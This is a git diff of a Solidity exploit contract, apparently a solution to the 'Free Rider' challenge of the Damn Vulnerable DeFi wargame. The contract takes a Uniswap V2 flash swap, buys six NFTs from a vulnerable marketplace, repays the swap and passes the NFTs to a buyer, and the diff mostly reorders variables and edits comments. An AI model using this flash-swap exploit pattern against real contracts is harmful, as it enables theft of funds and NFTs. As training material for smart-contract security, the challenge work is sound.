@@ -18,53 +18,55 @@ interface IMarketplace{
 
 contract RiderAttack is IERC721Receiver{
 
-    IWETH weth;
-    IMarketplace marketplace;
     IUniswapV2Factory factory;
     IUniswapV2Pair uniPair;
     DamnValuableNFT dvNFT;
+    IWETH weth;
+    IMarketplace marketplace;
     address buyer;
 
     constructor(
-        IWETH _weth,
-        IMarketplace _marketplace,
         IUniswapV2Factory _factory,
         IUniswapV2Pair _uniPair,
         DamnValuableNFT _dvNFT,
+        IWETH _weth,
+        IMarketplace _marketplace,
         address _buyer
     ) {
-        weth = _weth;
-        marketplace = _marketplace;
         factory = _factory;
         uniPair = _uniPair;
         dvNFT = _dvNFT;
+        weth = _weth;
+        marketplace = _marketplace;
         buyer = _buyer;
     }
 
+    //attack
     function attack(uint256 _amount) external {
-        uniPair.swap(_amount, 0, address(this), "not empty");    
+        uniPair.swap(_amount, 0, address(this), "give my a flashswap");  
     }
 
     function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
         address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
         address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
         assert(msg.sender == factory.getPair(token0, token1)); // ensure that msg.sender is a V2 pair
-        
-        //unwrap the weth into eth
+        // rest of the function goes here!
+
+        //unwrap the weth 
         weth.withdraw(amount0);
 
-        //create an array for the NFTs
+        //create an array
         uint256[] memory NFTs = new uint256[](6);
 
         for (uint256 i = 0; i < 6; i++){
             NFTs[i] = i;
         }
 
-        //buy many NFTs
-        marketplace.buyMany{value: amount0}(NFTs);
+        //buy many with the tokenIDs
+        marketplace.buyMany{value: 15 ether}(NFTs);
 
-        //calculate the fees
-        uint256 fees = (amount0 * 100301) / 100000;
+        //calculate the fees on the flashswap
+        uint256 fees = (amount0 * 100301) / 100000; 
 
         //rewrap our eth into weth
         weth.deposit{value: fees}();
@@ -72,9 +74,9 @@ contract RiderAttack is IERC721Receiver{
         //repay the flashswap
         weth.transfer(msg.sender, fees);
 
-        //transfer the tokens to the buyer
-        for (uint i = 0; i < 6; i++){
-            dvNFT.safeTransferFrom(address(this), buyer, NFTs[i]); 
+        //transfer tokens to the buyer
+        for (uint256 i = 0; i < 6; i ++){
+            dvNFT.safeTransferFrom(address(this), buyer, NFTs[i]);
         }
 
         }
@@ -89,9 +91,7 @@ contract RiderAttack is IERC721Receiver{
         override
         returns (bytes4) 
     {
-        
         return IERC721Receiver.onERC721Received.selector;
-
     }
 
         receive() external payable{}
